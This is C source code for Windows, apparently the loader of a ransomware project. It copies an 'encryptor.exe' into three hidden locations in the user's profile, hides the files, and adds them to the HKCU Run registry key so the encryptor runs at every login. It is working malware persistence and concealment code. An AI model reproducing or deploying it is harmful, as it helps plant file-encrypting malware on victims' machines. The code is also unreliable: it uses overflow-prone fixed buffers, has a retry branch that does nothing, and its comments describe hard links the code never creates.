#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>
#include <tchar.h>

int main() {

    /*
    Creates 3 executable files at 3 specific locations, sets their attributes to hidden, 
    and creates hard links between them and encryptor executable.
    It also adds entries to the Windows registry to run the copied files on startup.

    */
    char username[10];
    DWORD username_len=10;
    if(!GetUserNameA(username, &username_len))
    {
        printf("Error: ");
        return 1;
    }

    char init_path[40]="C:\\Users\\";
    strcat(init_path,username);
    printf("Init path: %s\n",&init_path);

    //Location where copy1.exe will be located
    char copy1[50];
    strcpy(copy1,init_path);
    char additional[30]="\\AppData\\copy1.exe";
    strcat(copy1,additional);

    char copy2[50];
    strcpy(copy2,init_path);
    strcpy(additional,"\\Pictures\\copy2.exe");
    strcat(copy2,additional);

    char copy3[50];
    strcpy(copy3,init_path);
    strcpy(additional,"\\Contacts\\copy3.exe");
    strcat(copy3,additional);

   
    printf("src1 : %s\n",&copy1);
    printf("src2 : %s\n",&copy2);
    printf("src3 : %s\n",&copy3);
    
    //encryptor.exe must be present here. This executable is generated from encryptor.c
    char destination[50] = "C:\\newdestination\\encryptor.exe";

    //Creates hard links between newly created copies and encryptor.exe
    FILE *fp0;
    fp0= fopen(copy1, "r");
    if (!CopyFile(destination, copy1, FALSE)) {
        printf("Error: could not copy file\n");
    }
    //Set hidden attribute to copy files/exes.
    if (SetFileAttributes(copy1, FILE_ATTRIBUTE_HIDDEN) == 0) {
        printf("Error: could not set executable attribute to hidden1.\n");
    }

    if (!CopyFile(destination, copy2, FALSE)) {
        printf("Error: could not copy file 2\n");
    }
    if (SetFileAttributes(copy2, FILE_ATTRIBUTE_HIDDEN) == 0) {
        printf("Error: could not set executable attribute to hidden2.\n");
    }


    if (!CopyFile(destination, copy3, FALSE)) {
        printf("Error: could not copy file 3\n");
    }
    if (SetFileAttributes(copy3, FILE_ATTRIBUTE_HIDDEN) == 0) {
        printf("Error: could not set executable attribute to hidden3.\n");
    }

    if (SetFileAttributes(destination, FILE_ATTRIBUTE_HIDDEN) == 0) {
        printf("Error: could not set executable attribute to hidden4.\n");
    }

    //select random copy
    srand(time(NULL));
    int rand_num;
    char selected[45];
    FILE *fp1; 
    rand_num = rand() % 3;
    if (rand_num == 0 ) {
        fp1= fopen(copy1, "r");
        if(fp1!=NULL)
        {
            strcpy(selected,copy1);
        }
        else
        {
            rand_num=(rand_num+1)%3;
        }
    } 
    else if (rand_num == 1) {
        fp1= fopen(copy2, "r");
        if(fp1!=NULL)
        {
            strcpy(selected,copy2);
        }
        else
        {
            rand_num=(rand_num+1)%3;
        }
    } 
    else {
        fp1= fopen(copy3, "r");
        if(fp1!=NULL)
        {
            strcpy(selected,copy3);
        }
        else
        {
            printf("No files");
            return 0;
        }
    }

    printf("Hard links created successfully!\n");

    TCHAR programPath[250];
    GetModuleFileNameA(NULL, programPath, 250);

    // Open the Run key for the current user
     HKEY hKey;
    long result;
    result = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS)
    {
        printf("Failed to open registry key. Error code: %d\n", result);
        return 1;
    }
    //Set loader program and encryptor file paths to Run subkey.
    result = RegSetValueEx(hKey, _T("LoaderProg"), 0, REG_SZ, (BYTE *)programPath, strlen(programPath) + 1);
    if (result != ERROR_SUCCESS)
    {
        printf("Failed to add entry to registry key. Error code: %d\n", result);
        return 1;
    }

    result = RegSetValueEx(hKey, _T("EncryptorCopy"), 0, REG_SZ, (BYTE *)selected, strlen(selected) + 1);
    if (result != ERROR_SUCCESS)
    {
        printf("Failed to add entry to registry key. Error code: %d\n", result);
        return 1;
    }
    RegCloseKey(hKey);

    return 0;
}
